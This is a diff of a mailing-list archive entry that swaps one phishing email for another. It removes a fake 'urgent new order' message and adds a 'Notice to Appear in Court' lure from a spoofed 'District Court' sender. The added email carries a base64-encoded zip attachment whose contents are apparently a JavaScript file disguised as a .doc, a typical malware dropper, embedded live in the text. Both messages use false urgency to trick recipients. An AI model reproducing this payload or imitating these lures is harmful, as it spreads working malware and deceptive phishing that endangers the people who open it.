@@ -1,37 +1,133 @@
-From: kao@kao.es (Kao Europe S.L)
-Date: Mon, 9 Mar 2015 14:29:22 -0700
-Subject: Resending!! Urgently New Order
-Message-ID: <mailman.47.1425944930.22887.linux-mtd@lists.infradead.org>
+Received: from gateway22.websitewelcome.com ([192.185.47.144])
+ by bombadil.infradead.org with esmtps (Exim 4.80.1 #2 (Red Hat Linux))
+ id 1YdBlm-0001b8-Fa
+ for linux-mtd@lists.infradead.org; Wed, 01 Apr 2015 06:04:55 +0000
+Received: from gator3309.hostgator.com (gator3309.hostgator.com
+ [192.254.250.173])
+ by gateway22.websitewelcome.com (Postfix) with ESMTP id 808CCB5661915
+ for <linux-mtd@lists.infradead.org>; Wed,  1 Apr 2015 01:04:28 -0500 (CDT)
+Received: from fanapp65 by gator3309.hostgator.com with local (Exim 4.82)
+ (envelope-from <fanapp65@gator3309.hostgator.com>)
+ id 1YdBlL-0004ZK-Un
+ for linux-mtd@lists.infradead.org; Wed, 01 Apr 2015 01:04:27 -0500
 To: linux-mtd@lists.infradead.org
-List-Id: linux-mtd.lists.infradead.org
+Subject: Notice to Appear in Court
+Date: Wed, 1 Apr 2015 01:04:27 -0500
+From: "District Court" <arnold.welch@aawestpalmbeachplumbers.net>
+Reply-To: "District Court" <arnold.welch@aawestpalmbeachplumbers.net>
+Message-ID: <4909ef870f18b8add83e5908e05cecc3@aawestpalmbeachplumbers.net>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b1_6a88d7f7fe9bc407d3929d9c868012c4"
+Content-Transfer-Encoding: 8bit
+List-Id: Linux MTD discussion mailing list <linux-mtd.lists.infradead.org>
+List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-mtd>,
+ <mailto:linux-mtd-request@lists.infradead.org?subject=unsubscribe>
+List-Archive: <http://lists.infradead.org/pipermail/linux-mtd/>
+List-Post: <mailto:linux-mtd@lists.infradead.org>
+List-Help: <mailto:linux-mtd-request@lists.infradead.org?subject=help>
+List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-mtd>,
+ <mailto:linux-mtd-request@lists.infradead.org?subject=subscribe>
+
+--b1_6a88d7f7fe9bc407d3929d9c868012c4
+Content-Type: text/plain; charset=us-ascii
+
+Notice to Appear,
+
+This is to inform you to appear in the Court on the April 05 for your case hearing.
+Please, prepare all the documents relating to the case and bring them to Court on the specified date.
+Note: If you do not come, the case will be heard in your absence.
+
+The copy of Court Notice is attached to this email.
+
+Regards,
+Arnold Welch,
+Court Secretary.
 
 
+--b1_6a88d7f7fe9bc407d3929d9c868012c4
+Content-Type: application/zip; name="00696536.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=00696536.zip
 
-Dear Sir,
+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
+AAAAAQABAD0AAAAcEQAAAAA=
 
 
-Why have we not heard from you since we send details for our new order and i am
-resending again.
-
-Kindly check and  confirm to us the availability of the products attached in the files
-with complete SPEC and Quantity then quote to us your best price for our kind
-evaluation and urgent purchase
-
-Pls note customers are in high demand for it, so revert Asap.
-
-	
-Chritina Vague	
-Kao Chemicals Europe, S.L.
-Puig dels Tudons, 10
-E-08210 Barber? del
-Tel: +34 93 7399-300 
-Fax: +34 93 7399-333
-e-mail: kao at kao.es 
-Vall?s (Barcelona), Spain
--------------- next part --------------
-A non-text attachment was scrubbed...
-Name: DOC20150011639801163672-pdf.rar
-Type: application/octet-stream
-Size: 1248387 bytes
-Desc: not available
-URL: <http://lists.infradead.org/pipermail/linux-mtd/attachments/20150309/b9cdcd16/attachment.obj>
+--b1_6a88d7f7fe9bc407d3929d9c868012c4--
